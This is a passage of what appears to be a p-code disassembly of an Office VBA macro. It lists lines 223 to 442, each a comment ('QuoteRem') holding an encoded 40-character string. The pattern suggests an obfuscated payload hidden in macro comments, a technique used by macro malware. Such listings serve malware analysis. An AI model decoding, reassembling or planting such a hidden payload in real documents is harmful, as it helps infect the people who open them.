' 	QuoteRem 0x0000 0x0028 "%(!#&%)($'&'-'.&.!+!##0%!(%(*'0'/'$('$##"
' Line #223:
' 	QuoteRem 0x0000 0x0028 ".$####.!+!,&)%,%&%*&0&$%&&#&#&&%/%%&0&&&"
' Line #224:
' 	QuoteRem 0x0000 0x0028 "$&&%#&-&$&0'''%((("'#(&'-&.%*'$'#(0'$(0'"
' Line #225:
' 	QuoteRem 0x0000 0x0028 "''%(-&0%''''*'$'&'-&)$/#!$-&(&0'#(%'-&0%"
' Line #226:
' 	QuoteRem 0x0000 0x0028 "!(%(*'0'/'$(.&.!+!##&%/'"'#'-'&'.%"'$'#("
' Line #227:
' 	QuoteRem 0x0000 0x0028 "0''&*'#(&($(!&#(0'%(&'$'%(*'0'/'##.$##!$"
' Line #228:
' 	QuoteRem 0x0000 0x0028 "##.!+!,&)%,%&%*&0&-%0%$%"%-%0&.%"%$%)%*%"
' Line #229:
' 	QuoteRem 0x0000 0x0028 "/%&%-&$&0'''%((("'#(&'-&.%*'$'#(0'$(0'''"
' Line #230:
' 	QuoteRem 0x0000 0x0028 "%(-&0%''''*'$'&'-&)$/#!$-&(&0'#(%'-&0%!("
' Line #231:
' 	QuoteRem 0x0000 0x0028 "%(*'0'/'$(.&.!+!##&%/'"'#'-'&'.%"'$'#(0'"
' Line #232:
' 	QuoteRem 0x0000 0x0028 "'&*'#(&($(!&#(0'%(&'$'%(*'0'/'##.$##!$##"
' Line #233:
' 	QuoteRem 0x0000 0x0028 ".!+!,&)%,%&%*&0&$%&&#&#&&%/%%&0&&&$&&%#&"
' Line #234:
' 	QuoteRem 0x0000 0x0028 "-&$&0'''%((("'#(&'-&.%*'$'#(0'$(0'''%(-&"
' Line #235:
' 	QuoteRem 0x0000 0x0028 "(&*'/'%'0'(($(-&$%&(#(#(&'/'%('&&'#($(*'"
' Line #236:
' 	QuoteRem 0x0000 0x0028 "0'/'-&*%/'%(&'#(/'&'%(!#$&&'%(%(*'/'('$("
' Line #237:
' 	QuoteRem 0x0000 0x0028 "-&+&0'/'&'$(-&!$.&.!+!##"$#$!$"$##!#.$!#"
' Line #238:
' 	QuoteRem 0x0000 0x0028 "####.!+!,&)%,%&%*&0&-%0%$%"%-%0&.%"%$%)%"
' Line #239:
' 	QuoteRem 0x0000 0x0028 "*%/%&%-&$&0'''%((("'#(&'-&.%*'$'#(0'$(0'"
' Line #240:
' 	QuoteRem 0x0000 0x0028 "''%(-&(&*'/'%'0'(($(-&$%&(#(#(&'/'%('&&'"
' Line #241:
' 	QuoteRem 0x0000 0x0028 "#($(*'0'/'-&*%/'%(&'#(/'&'%(!#$&&'%(%(*'"
' Line #242:
' 	QuoteRem 0x0000 0x0028 "/'('$(-&+&0'/'&'$(-&!$.&.!+!##"$#$!$"$##"
' Line #243:
' 	QuoteRem 0x0000 0x0028 "!#.$!#####.!+!,&)%,%&%*&0&$%&&#&#&&%/%%&"
' Line #244:
' 	QuoteRem 0x0000 0x0028 "0&&&$&&%#&-&$&0'''%((("'#(&'-&.%*'$'#(0'"
' Line #245:
' 	QuoteRem 0x0000 0x0028 "$(0'''%(-&*%/'%(&'#(/'&'%(!#&%)(!(-'0'#("
' Line #246:
' 	QuoteRem 0x0000 0x0028 "&'#(-&.%"'*'/'.&.!+!##$&%("'#(%(!#!&"'('"
' Line #247:
' 	QuoteRem 0x0000 0x0028 "&'##.$####.!+!,&)%,%&%*&0&-%0%$%"%-%0&.%"
' Line #248:
' 	QuoteRem 0x0000 0x0028 ""%$%)%*%/%&%-&$&0'''%((("'#(&'-&.%*'$'#("
' Line #249:
' 	QuoteRem 0x0000 0x0028 "0'$(0'''%(-&*%/'%(&'#(/'&'%(!#&%)(!(-'0'"
' Line #250:
' 	QuoteRem 0x0000 0x0028 "#(&'#(-&.%"'*'/'.&.!+!##$&%("'#(%(!#!&"'"
' Line #251:
' 	QuoteRem 0x0000 0x0028 "('&'##.$####.!+!-$)'%(.'-'/$!#-$$%*(#'&'"
' Line #252:
' 	QuoteRem 0x0000 0x0028 "#($&)'"'%'0'((/$.!+!-$#%0%%%*&/$.!+!-$$("
' Line #253:
' 	QuoteRem 0x0000 0x0028 "$'#(*'!(%(!#-'"'/'('&("'('&'.$##'&#%$&$'"
' Line #254:
' 	QuoteRem 0x0000 0x0028 "#(*'!(%(##/$-$"#.#.#.!+!!&#(*''("'%(&'!#"
' Line #255:
' 	QuoteRem 0x0000 0x0028 "$&&(#'!#(&*'/'%'0'((0&0%/'-'0'"'%'.!+!!#"
' Line #256:
' 	QuoteRem 0x0000 0x0028 "0%/'!#&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%("
' Line #257:
' 	QuoteRem 0x0000 0x0028 ".!+!!#*%''!#-'0'$'"'%(*'0'/'/#!(#(0'%(0'"
' Line #258:
' 	QuoteRem 0x0000 0x0028 "$'0'-'!#.$!###''*'-'&'+$##!#%()'&'/'.!+!"
' Line #259:
' 	QuoteRem 0x0000 0x0028 "!#!#%%*'.'!#'%$&0%.!+!!#!#$&&'%(!#'%$&0%"
' Line #260:
' 	QuoteRem 0x0000 0x0028 "!#.$!#$%#(&'"'%(&'0%#'+'&'$'%()###$&$'#("
' Line #261:
' 	QuoteRem 0x0000 0x0028 "*'!(%(*'/'('/#'%*'-'&'$&*($(%(&'.'0%#'+'"
' Line #262:
' 	QuoteRem 0x0000 0x0028 "&'$'%(##*#.!+!!#!#)%0'$(%(!&"'%()'!#.$!#"
' Line #263:
' 	QuoteRem 0x0000 0x0028 "#&&'!(-'"'$'&')#-'0'$'"'%(*'0'/'/#)'#(&'"
' Line #264:
' 	QuoteRem 0x0000 0x0028 "''-#!###''*'-'&'+$0#0#0###-#!#####*#.!+!"
' Line #265:
' 	QuoteRem 0x0000 0x0028 "!#!#)%0'$(%(!&"'%()'!#.$!##&&'!(-'"'$'&'"
' Line #266:
' 	QuoteRem 0x0000 0x0028 ")#)%0'$(%(!&"'%()'-#!###0###-#!###-&##*#"
' Line #267:
' 	QuoteRem 0x0000 0x0028 ".!+!!#!#$&&'%(!#(&0'#(%'0%#'+'!#.$!#(%&'"
' Line #268:
' 	QuoteRem 0x0000 0x0028 "%(0%#'+'&'$'%()#####-###(&0'#(%'/#"%!(!("
' Line #269:
' 	QuoteRem 0x0000 0x0028 "-'*'$'"'%(*'0'/'##*#+$!#"&&(*'%(!#.$!#!$"
' Line #270:
' 	QuoteRem 0x0000 0x0028 ".!+!!#!#*%''!#(&0'#(%'0%#'+'!#.$!#####!#"
' Line #271:
' 	QuoteRem 0x0000 0x0028 "%&)'&'/'!#$&&'%(!#(&0'#(%'0%#'+'!#.$!#$%"
' Line #272:
' 	QuoteRem 0x0000 0x0028 "#(&'"'%(&'0%#'+'&'$'%()###(&0'#(%'/#"%!("
' Line #273:
' 	QuoteRem 0x0000 0x0028 "!(-'*'$'"'%(*'0'/'##*#+$!#"&&(*'%(!#.$!#"
' Line #274:
' 	QuoteRem 0x0000 0x0028 ""$.!+!!#!#$&&'%(!#/%%&!#.$!#(&0'#(%'0%#'"
' Line #275:
' 	QuoteRem 0x0000 0x0028 "+'/#%&&'.'!(-'"'%(&'$()#"$*#/#'&#%!&#(0'"
' Line #276:
' 	QuoteRem 0x0000 0x0028 "+'&'$'%(/#'&#%$%0'.'!(0'/'&'/'%($()#"$*#"
' Line #277:
' 	QuoteRem 0x0000 0x0028 "/#$%0'%'&'.'0'%'&(-'&'.!+!!#!#*%''!#/%%&"
' Line #278:
' 	QuoteRem 0x0000 0x0028 "/#-%*'/'&'$()#"$-#"$*#!#-$/$!###(#-$)'%("
' Line #279:
' 	QuoteRem 0x0000 0x0028 ".'-'/$!#-$$%*(#'&'#($&)'"'%'0'((/$##!#%("
' Line #280:
' 	QuoteRem 0x0000 0x0028 ")'&'/'.!+!!#!#!#(&0'#(%'0%#'+'/#0%!(%(*'"
' Line #281:
' 	QuoteRem 0x0000 0x0028 "0'/'$(/#$&"''(&'/%0'#(.'"'-'!&#(0'.'!(%("
' Line #282:
' 	QuoteRem 0x0000 0x0028 "!#.$!#'%"'-'$(&'.!+!!#!#!#/%%&/#%%&'-'&'"
' Line #283:
' 	QuoteRem 0x0000 0x0028 "%(&'-%*'/'&'$(!#"$-#!#/%%&/#$%0'&(/'%(0%"
' Line #284:
' 	QuoteRem 0x0000 0x0028 "''-%*'/'&'$(.!+!!#!#!#/%%&/#"%%'%'''#(0'"
' Line #285:
' 	QuoteRem 0x0000 0x0028 ".'''*'-'&'!#)%0'$(%(!&"'%()'.!+!(#/%%&/#"
' Line #286:
' 	QuoteRem 0x0000 0x0028 "/%0'#(.'"'-'%&&'.'!(-'"'%(&'/#$&"''(&'.!"
' Line #287:
' 	QuoteRem 0x0000 0x0028 "+!!#!#!#'%0'#(!#+'!#.$!#"$!#%(0'!##$*$.!"
' Line #288:
' 	QuoteRem 0x0000 0x0028 "+!!#!#!#!#/%%&/##&&'!(-'"'$'&'-%*'/'&'!#"
' Line #289:
' 	QuoteRem 0x0000 0x0028 "+'-#!###(###!#,#!#/%%&/#-%*'/'&'$()#+'-#"
' Line #290:
' 	QuoteRem 0x0000 0x0028 ""$*#.!+!!#!#!#/%&')(%(.!+!!#!#!#'%0'#(!#"
' Line #291:
' 	QuoteRem 0x0000 0x0028 "+'!#.$!#$$!$!#%(0'!#/%%&/#$%0'&(/'%(0%''"
' Line #292:
' 	QuoteRem 0x0000 0x0028 "-%*'/'&'$(.#$$.!+!!#!#!#!#/%%&/##&&'!(-'"
' Line #293:
' 	QuoteRem 0x0000 0x0028 ""'$'&'-%*'/'&'!#+'-#!#.'*'%')#/%%&/#-%*'"
' Line #294:
' 	QuoteRem 0x0000 0x0028 "/'&'$()#+'-#"$*#-##$-#-'&'/')#/%%&/#-%*'"
' Line #295:
' 	QuoteRem 0x0000 0x0028 "/'&'$()#+'-#"$*#*#*#.!+!!#!#!#/%&')(%(.!"
' Line #296:
' 	QuoteRem 0x0000 0x0028 "+!!#!#&%/'%'!#*%''.!+!!#!#$&&'%(!#/%%&!#"
' Line #297:
' 	QuoteRem 0x0000 0x0028 ".$!#/%0'%()'*'/'('.!+!!#!#*'''!#"&&(*'%("
' Line #298:
' 	QuoteRem 0x0000 0x0028 ".$"$!#%()'&'/'!#(&0'#(%'0%#'+'/#"&&(*'%("
' Line #299:
' 	QuoteRem 0x0000 0x0028 ".!+!!#&%/'%'!#*'''.!+!&%/'%'!#$&&(#'.!+!"
' Line #300:
' 	QuoteRem 0x0000 0x0028 "(#!&#(*''("'%(&'!#$&&(#'!#%%0'$'&(.'&'/'"
' Line #301:
' 	QuoteRem 0x0000 0x0028 "%(0&$%-'0'$(&')#*#.!+!(#!#0%/'!#&%#(#(0'"
' Line #302:
' 	QuoteRem 0x0000 0x0028 "#(!##&&'$(&(.'&'!#/%&')(%(.!+!(#!#(#%&)'"
' Line #303:
' 	QuoteRem 0x0000 0x0028 "&'%&)'*'/'('.!+!(#!#(##'*(!#$%*(#'&'#($&"
' Line #304:
' 	QuoteRem 0x0000 0x0028 ")'"'%'0'((0#0#$&.%'%.!+!(#!#$%"'-'-'!#%%"
' Line #305:
' 	QuoteRem 0x0000 0x0028 "*'$("'#'-'&'"%-'-'.!+!(#!#$%"'-'-'!#*'/'"
' Line #306:
' 	QuoteRem 0x0000 0x0028 "''&'$'%(%%0'$'.!+!(#!#$%"'-'-'!#*'/'''&'"
' Line #307:
' 	QuoteRem 0x0000 0x0028 "$'%(.%*%#&$%.!+!(#!#$%"'-'-'!#(&#(*'%(&'"
' Line #308:
' 	QuoteRem 0x0000 0x0028 "%%&(.'!()###$'+$-&##*#+$(#!##('(!#.$!#$&"
' Line #309:
' 	QuoteRem 0x0000 0x0028 ")'&'-'-')###$'+$-&%()'&'%()'*'/'('/#$'0'"
' Line #310:
' 	QuoteRem 0x0000 0x0028 ".'##-#!#'$*#.!+!(#!#,%*'-'-'!###$'+$-&%("
' Line #311:
' 	QuoteRem 0x0000 0x0028 ")'&'%()'*'/'('/#$'0'.'##.!+!(#!#$%"'-'-'"
' Line #312:
' 	QuoteRem 0x0000 0x0028 "!#*'/'''&'$'%()%%&.%$&.!+!(#!#"%!(!(-'*'"
' Line #313:
' 	QuoteRem 0x0000 0x0028 "$'"'%(*'0'/'/#$&$'#(&'&'/'&&!(%'"'%(*'/'"
' Line #314:
' 	QuoteRem 0x0000 0x0028 "('!#.$!#%&#(&(&'.!+!(#&%/'%'!#$&&(#'.!+!"
' Line #315:
' 	QuoteRem 0x0000 0x0028 "(#!&#(*''("'%(&'!#$&&(#'!#*'/'''&'$'%()%"
' Line #316:
' 	QuoteRem 0x0000 0x0028 "%&.%$&)#*#.!+!(#!#0%/'!#&%#(#(0'#(!##&&'"
' Line #317:
' 	QuoteRem 0x0000 0x0028 "$(&(.'&'!#/%&')(%(.!+!(#!#"'!#.$!#$&*($("
' Line #318:
' 	QuoteRem 0x0000 0x0028 "%(&'.'/#!&#(*''("'%(&'!&#(0'''*'-'&'$&%("
' Line #319:
' 	QuoteRem 0x0000 0x0028 "#(*'/'(')#####-#!###)%,%&%*&0&$%&&#&#&&%"
' Line #320:
' 	QuoteRem 0x0000 0x0028 "/%%&0&&&$&&%#&-&$&0%'%%&(&"%#&&%-&.%*'$'"
' Line #321:
' 	QuoteRem 0x0000 0x0028 "#(0'$(0'''%(-&(&*'/'%'0'(($(-&$%&(#(#(&'"
' Line #322:
' 	QuoteRem 0x0000 0x0028 "/'%('&&'#($(*'0'/'-&&%)(!(-'0'#(&'#(-&$&"
' Line #323:
' 	QuoteRem 0x0000 0x0028 ")'&'-'-'!#'%0'-'%'&'#($(##-#!###!&&'#($("
' Line #324:
' 	QuoteRem 0x0000 0x0028 "0'/'"'-'##*#.!+!(#!#$%"'-'-'!#$&&'"'#($'"
' Line #325:
' 	QuoteRem 0x0000 0x0028 ")''%0'#()%%&.%)#"'*#.!+!(#!#"'!#.$!#&%/'"
' Line #326:
' 	QuoteRem 0x0000 0x0028 "'(*'#(0'/')###!&"%%&)%##*#.!+!(#!#*'!#.$"
' Line #327:
' 	QuoteRem 0x0000 0x0028 "!#"$.!+!(#!#%%0'!#(&)'*'-'&'!#*'!#-$.$!#"
' Line #328:
' 	QuoteRem 0x0000 0x0028 "-%&'/')#"'*#.!+!(#!#!#$'!#.$!#####.!+!(#"
' Line #329:
' 	QuoteRem 0x0000 0x0028 "!#!#%%0'!#(&)'*'-'&'!#*'!#-$.$!#-%&'/')#"
' Line #330:
' 	QuoteRem 0x0000 0x0028 ""'*#!#"%/'%'!#.%*'%'%#)#"'-#!#*'-#!#"$*#"
' Line #331:
' 	QuoteRem 0x0000 0x0028 "!#-$/$!###,$##.!+!(#!#!#!#$'!#.$!#$'!#,#"
' Line #332:
' 	QuoteRem 0x0000 0x0028 "!#.%*'%'%#)#"'-#!#*'-#!#"$*#.!+!(#!#!#!#"
' Line #333:
' 	QuoteRem 0x0000 0x0028 "*'!#.$!#*'!#,#!#"$.!+!(#!#!#-%0'0'!(.!+!"
' Line #334:
' 	QuoteRem 0x0000 0x0028 "(#!#!#$%"'-'-'!#$&&'"'#($')''%0'#()%%&.%"
' Line #335:
' 	QuoteRem 0x0000 0x0028 ")#$'*#.!+!(#!#!#*'!#.$!#*'!#,#!#"$.!+!(#"
' Line #336:
' 	QuoteRem 0x0000 0x0028 "!#-%0'0'!(.!+!(#&%/'%'!#$&&(#'.!+!(#!&#("
' Line #337:
' 	QuoteRem 0x0000 0x0028 "*''("'%(&'!#$&&(#'!#'&*'&'(('&#%$%0'%'&'"
' Line #338:
' 	QuoteRem 0x0000 0x0028 ")#*#+$!#$&%(&'"'-'%()'+$!#&%/'%'!#$&&(#'"
' Line #339:
' 	QuoteRem 0x0000 0x0028 ".!+!(#!&#(*''("'%(&'!#$&&(#'!#%&0'0'-'$("
' Line #340:
' 	QuoteRem 0x0000 0x0028 ".%"'$'#(0')#*#+$!#$&%(&'"'-'%()'+$!#&%/'"
' Line #341:
' 	QuoteRem 0x0000 0x0028 "%'!#$&&(#'.!+!(#!&#(*''("'%(&'!#$&&(#'!#"
' Line #342:
' 	QuoteRem 0x0000 0x0028 "'%*'-'&'%&&'.'!(-'"'%(&'$()#*#+$!#$&%(&'"
' Line #343:
' 	QuoteRem 0x0000 0x0028 ""'-'%()'+$!#&%/'%'!#$&&(#'.!+!(#!&#(*''("
' Line #344:
' 	QuoteRem 0x0000 0x0028 ""'%(&'!#$&&(#'!#$&%(&'"'-'%()')#*#+$!#0%"
' Line #345:
' 	QuoteRem 0x0000 0x0028 "/'!#&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!"
' Line #346:
' 	QuoteRem 0x0000 0x0028 "+!(#!#!#!#!#$&)'0'(('&*'$(&("'-'#%"'$(*'"
' Line #347:
' 	QuoteRem 0x0000 0x0028 "$'&%%'*'%(0'#(!#.$!#!$+$!#"%!(!(-'*'$'"'"
' Line #348:
' 	QuoteRem 0x0000 0x0028 "%(*'0'/'/#&%/'"'#'-'&'$%"'/'$'&'-',%&'*("
' Line #349:
' 	QuoteRem 0x0000 0x0028 "!#.$!#!$.!+!(#&%/'%'!#$&&(#'.!+!(#!&#(*'"
' Line #350:
' 	QuoteRem 0x0000 0x0028 "'("'%(&'!#$&&(#'!#$&&'"'#($')''%0'#()%%&"
' Line #351:
' 	QuoteRem 0x0000 0x0028 ".%)#!&"'%()''%0'#()%%&.%*#.!+!(#!#0%/'!#"
' Line #352:
' 	QuoteRem 0x0000 0x0028 "&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!+!(#"
' Line #353:
' 	QuoteRem 0x0000 0x0028 "!#%&"'#(('&'%(!#.$!#%%*'#(%#)#!&"'%()''%"
' Line #354:
' 	QuoteRem 0x0000 0x0028 "0'#()%%&.%!#,#!###-&+#/#)'%(.'+###*#.!+!"
' Line #355:
' 	QuoteRem 0x0000 0x0028 "(#!#*%''!#%&"'#(('&'%(!#.$!#####!#%&)'&'"
' Line #356:
' 	QuoteRem 0x0000 0x0028 "/'!#(%0'%&0'!#/%0')%%&.%$(.!+!(#!#%%0'.!"
' Line #357:
' 	QuoteRem 0x0000 0x0028 "+!(#!#!#0%!(&'/'!#!&"'%()''%0'#()%%&.%!#"
' Line #358:
' 	QuoteRem 0x0000 0x0028 ",#!###-&##!#,#!#%&"'#(('&'%(!#'%0'#(!#*%"
' Line #359:
' 	QuoteRem 0x0000 0x0028 "/'!(&(%(!#"%$(!#$#"$.!+!(#!#!#-%*'/'&'!#"
' Line #360:
' 	QuoteRem 0x0000 0x0028 "*%/'!(&(%(!#$#"$-#!#"'.!+!(#!#!#*%''!#"'"
' Line #361:
' 	QuoteRem 0x0000 0x0028 "!#-$/$!###-$)'%(.'-'/$!#-$$%*(#'&'#($&)'"
' Line #362:
' 	QuoteRem 0x0000 0x0028 ""'%'0'((/$##!#%&)'&'/'.!+!(#!#!#!#$'!#.$"
' Line #363:
' 	QuoteRem 0x0000 0x0028 "!#"'.!+!(#!#!#!#%%0'!#(&)'*'-'&'!#/%0'%("
' Line #364:
' 	QuoteRem 0x0000 0x0028 "!#&%0%'%)#"$*#.!+!(#!#!#!#!#*%/'!(&(%(!#"
' Line #365:
' 	QuoteRem 0x0000 0x0028 "$#"$-#!#"'.!+!(#!#!#!#!#$'!#.$!#$'!#,#!#"
' Line #366:
' 	QuoteRem 0x0000 0x0028 "$%)'#(%#)#"$$$*#!#,#!#$%)'#(%#)#"$!$*#!#"
' Line #367:
' 	QuoteRem 0x0000 0x0028 ",#!#"'.!+!(#!#!#!#-%0'0'!(.!+!(#!#!#$%-'"
' Line #368:
' 	QuoteRem 0x0000 0x0028 "0'$(&'!#$#"$.!+!(#!#!#0%!(&'/'!#!&"'%()'"
' Line #369:
' 	QuoteRem 0x0000 0x0028 "'%0'#()%%&.%!#,#!###-&##!#,#!#%&"'#(('&'"
' Line #370:
' 	QuoteRem 0x0000 0x0028 "%(!#'%0'#(!#0%&(%(!(&(%(!#"%$(!#$#"$.!+!"
' Line #371:
' 	QuoteRem 0x0000 0x0028 "(#!#!#!#$&&'%(!#"%%%!#.$!#"%$'%(*''(&'%%"
' Line #372:
' 	QuoteRem 0x0000 0x0028 "0'$'&(.'&'/'%(/#'&#%!&#(0'+'&'$'%(/#'&#%"
' Line #373:
' 	QuoteRem 0x0000 0x0028 "$%0'.'!(0'/'&'/'%($()#"$*#/#$%0'%'&'.%0'"
' Line #374:
' 	QuoteRem 0x0000 0x0028 "%'&(-'&'.!+!(#!#!#!#'%0'#(!#*'!#.$!#"$!#"
' Line #375:
' 	QuoteRem 0x0000 0x0028 "%&0'!#"%%%/#$'0'&(/'%(0'''-'*'/'&'$(.!+!"
' Line #376:
' 	QuoteRem 0x0000 0x0028 "(#!#!#!#!#$'"'!#.$!#"%%%/#-'*'/'&'$()#*'"
' Line #377:
' 	QuoteRem 0x0000 0x0028 "-#!#"$*#.!+!(#!#!#!#!#*%''!#*'!#-$!#$$!$"
' Line #378:
' 	QuoteRem 0x0000 0x0028 "!#%&)'&'/'!#$'"'!#.$!#.%*'%'%#)#$'"'-#!#"
' Line #379:
' 	QuoteRem 0x0000 0x0028 "#$-#!#-%&'/')#$'"'*#!#.#!#"$*#.!+!(#!#!#"
' Line #380:
' 	QuoteRem 0x0000 0x0028 "!#!#*%''!#*'!#.$/$!#$$!$!#"'/'%'!#*'!#-$"
' Line #381:
' 	QuoteRem 0x0000 0x0028 "!#"%%%/#$'0'&(/'%(0'''-'*'/'&'$(!#.#!##$"
' Line #382:
' 	QuoteRem 0x0000 0x0028 "!#%()'&'/'!#$'"'!#.$!###(###!#,#!#$'"'.!"
' Line #383:
' 	QuoteRem 0x0000 0x0028 "+!(#!#!#!#!#*'''!#$'"'!#-$/$!#####!#%()'"
' Line #384:
' 	QuoteRem 0x0000 0x0028 "&'/'!#!&#(*'/'%(!#$#"$-#!#$'"'.!+!(#!#!#"
' Line #385:
' 	QuoteRem 0x0000 0x0028 "!#/%&')(%(.!+!(#!#!#!&#(*'/'%(!#$#"$-#!#"
' Line #386:
' 	QuoteRem 0x0000 0x0028 "$'.!+!(#!#!#&%/'%'!#*%''.!+!(#!#!#$%-'0'"
' Line #387:
' 	QuoteRem 0x0000 0x0028 "$(&'!#$#"$.!+!(#!#!#%&"'#(('&'%(!#.$!#%%"
' Line #388:
' 	QuoteRem 0x0000 0x0028 "*'#(%#.!+!(#!#-%0'0'!(!#(&)'*'-'&'!#%&"'"
' Line #389:
' 	QuoteRem 0x0000 0x0028 "#(('&'%(!#-$/$!#####.!+!(#/%0')%%&.%$(+$"
' Line #390:
' 	QuoteRem 0x0000 0x0028 ".!+!(#&%/'%'!#$&&(#'.!+!(#!&#(*''("'%(&'"
' Line #391:
' 	QuoteRem 0x0000 0x0028 "!#$&&(#'!#*'/'''&'$'%(.%*%#&$%)#*#.!+!(#"
' Line #392:
' 	QuoteRem 0x0000 0x0028 "!#'%0'#(!#*'!#.$!#!$!#%&0'!#&$.!+!(#!#!#"
' Line #393:
' 	QuoteRem 0x0000 0x0028 ""'!#.$!#$%)'#(%#)#"%$($')###$%##*#!#,#!#"
' Line #394:
' 	QuoteRem 0x0000 0x0028 "*'*#.!+!(#!#!#$%"'-'-'!#*'/'''&'$'%()#"'"
' Line #395:
' 	QuoteRem 0x0000 0x0028 "*#.!+!(#!#/%&')(%(.!+!(#&%/'%'!#$&&(#'.!"
' Line #396:
' 	QuoteRem 0x0000 0x0028 "+!(#!&#(*''("'%(&'!#$&&(#'!#*'/'''&'$'%("
' Line #397:
' 	QuoteRem 0x0000 0x0028 ")#"'*#.!+!(#!#0%/'!#&%#(#(0'#(!#(%0'%&0'"
' Line #398:
' 	QuoteRem 0x0000 0x0028 "!#0'&(%(%("'.!+!(#!#"'"$!#.$!#"'!#,#!###"
' Line #399:
' 	QuoteRem 0x0000 0x0028 "+$-&.'*'#($'-&##.!+!(#!#0%!(&'/'!#"'"$!#"
' Line #400:
' 	QuoteRem 0x0000 0x0028 ",#!###$($'#(*'!(%(/#*'/'*'##!#'%0'#(!#0%"
' Line #401:
' 	QuoteRem 0x0000 0x0028 "&(%(!(&(%(!#"%$(!#$#"$.!+!(#!#!#!&#(*'/'"
' Line #402:
' 	QuoteRem 0x0000 0x0028 "%(!#$#"$-#!###,&$($'#(*'!(%(.&##.!+!(#!#"
' Line #403:
' 	QuoteRem 0x0000 0x0028 "!#!&#(*'/'%(!#$#"$-#!###/'!$.$0'/'!#"$+$"
' Line #404:
' 	QuoteRem 0x0000 0x0028 "+%0%*%/%+$$#+$0#%'$'$'!#$(&'/'%'!#%#/'*'"
' Line #405:
' 	QuoteRem 0x0000 0x0028 "$','!###!#,#!#"'"$!#,#!###%()'&'%()'*'/'"
' Line #406:
' 	QuoteRem 0x0000 0x0028 "('/#$'0'.'##.!+!(#!#$%-'0'$(&'!#$#"$.!+!"
' Line #407:
' 	QuoteRem 0x0000 0x0028 "(#!#%'#(0'!(!(&'#(!&"'%()'!#.$!#"'"$.!+!"
' Line #408:
' 	QuoteRem 0x0000 0x0028 "(#!#$%"'-'-'!#(&#(*'%(&'%%&(.'!()#%'#(0'"
' Line #409:
' 	QuoteRem 0x0000 0x0028 "!(!(&'#(!&"'%()'*#.!+!(#0'&(%(%("'+$.!+!"
' Line #410:
' 	QuoteRem 0x0000 0x0028 "(#&%/'%'!#$&&(#'.!+!(#!&#(*''("'%(&'!#$&"
' Line #411:
' 	QuoteRem 0x0000 0x0028 "&(#'!#%%*'$("'#'-'&'"%-'-')#*#.!+!(#!#0%"
' Line #412:
' 	QuoteRem 0x0000 0x0028 "/'!#&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!"
' Line #413:
' 	QuoteRem 0x0000 0x0028 "+!(#!#$&&'%("%%(%(#(!#/%0'#(.'"'-'%&&'.'"
' Line #414:
' 	QuoteRem 0x0000 0x0028 "!(-'"'%(&'/#!&"'%()'!#,#!###-&##!#,#!#/%"
' Line #415:
' 	QuoteRem 0x0000 0x0028 "0'#(.'"'-'%&&'.'!(-'"'%(&'-#!#!$.!+!(#!#"
' Line #416:
' 	QuoteRem 0x0000 0x0028 "(&*'%()'!#"%!(!(-'*'$'"'%(*'0'/'.!+!(#!#"
' Line #417:
' 	QuoteRem 0x0000 0x0028 "!#/#&%/'"'#'-'&'$%"'/'$'&'-',%&'*(!#.$!#"
' Line #418:
' 	QuoteRem 0x0000 0x0028 "%&#(&(&'.!+!(#!#!#/#$&$'#(&'&'/'&&!(%'"'"
' Line #419:
' 	QuoteRem 0x0000 0x0028 "%(*'/'('!#.$!#'%"'-'$(&'.!+!(#!#!#/#$&)'"
' Line #420:
' 	QuoteRem 0x0000 0x0028 "0'(('&*'$(&("'-'#%"'$(*'$'&%%'*'%(0'#(!#"
' Line #421:
' 	QuoteRem 0x0000 0x0028 ".$!#'%"'-'$(&'.!+!(#!#&%/'%'!#(&*'%()'.!"
' Line #422:
' 	QuoteRem 0x0000 0x0028 "+!(#!#(&*'%()'!#0%!(%(*'0'/'$(.!+!(#!#!#"
' Line #423:
' 	QuoteRem 0x0000 0x0028 "/#$%0'/'''*'#(.'$%0'/''(&'#($(*'0'/'$(!#"
' Line #424:
' 	QuoteRem 0x0000 0x0028 ".$!#'%"'-'$(&'.!+!(#!#!#/#$&"''(&'/%0'#("
' Line #425:
' 	QuoteRem 0x0000 0x0028 ".'"'-'!&#(0'.'!(%(!#.$!#'%"'-'$(&'.!+!(#"
' Line #426:
' 	QuoteRem 0x0000 0x0028 "!#!#/#'&*'#(&($(!&#(0'%(&'$'%(*'0'/'!#.$"
' Line #427:
' 	QuoteRem 0x0000 0x0028 "!#'%"'-'$(&'.!+!(#!#&%/'%'!#(&*'%()'.!+!"
' Line #428:
' 	QuoteRem 0x0000 0x0028 "(#&%/'%'!#$&&(#'.!+!(#!&#(*''("'%(&'!#$&"
' Line #429:
' 	QuoteRem 0x0000 0x0028 "&(#'!#*'/'''&'$'%(%%0'$')#*#.!+!(#!#0%/'"
' Line #430:
' 	QuoteRem 0x0000 0x0028 "!#&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!+!"
' Line #431:
' 	QuoteRem 0x0000 0x0028 "(#!#$&&'%(!#/%%&!#.$!#/%0'#(.'"'-'%&&'.'"
' Line #432:
' 	QuoteRem 0x0000 0x0028 "!(-'"'%(&'/#'&#%!&#(0'+'&'$'%(/#'&#%$%0'"
' Line #433:
' 	QuoteRem 0x0000 0x0028 ".'!(0'/'&'/'%($()#"$*#/#$%0'%'&'.%0'%'&("
' Line #434:
' 	QuoteRem 0x0000 0x0028 "-'&'.!+!(#!#$&&'%(!#"%%%!#.$!#"%$'%(*''("
' Line #435:
' 	QuoteRem 0x0000 0x0028 "&'%%0'$'&(.'&'/'%(/#'&#%!&#(0'+'&'$'%(/#"
' Line #436:
' 	QuoteRem 0x0000 0x0028 "'&#%$%0'.'!(0'/'&'/'%($()#"$*#/#$%0'%'&'"
' Line #437:
' 	QuoteRem 0x0000 0x0028 ".%0'%'&(-'&'.!+!(#!#*%''!#/%%&/#-'*'/'&'"
' Line #438:
' 	QuoteRem 0x0000 0x0028 "$()#"$-#!#"$*#!#-$/$!###(#-$)'%(.'-'/$!#"
' Line #439:
' 	QuoteRem 0x0000 0x0028 "-$$%*(#'&'#($&)'"'%'0'((/$##!#%&)'&'/'.!"
' Line #440:
' 	QuoteRem 0x0000 0x0028 "+!(#!#!#!#/%%&/#%%&'-'&'%(&'-%*'/'&'$(!#"
' Line #441:
' 	QuoteRem 0x0000 0x0028 ""$-#!#/%%&/#$'0'&(/'%(0'''-'*'/'&'$(.!+!"
' Line #442:
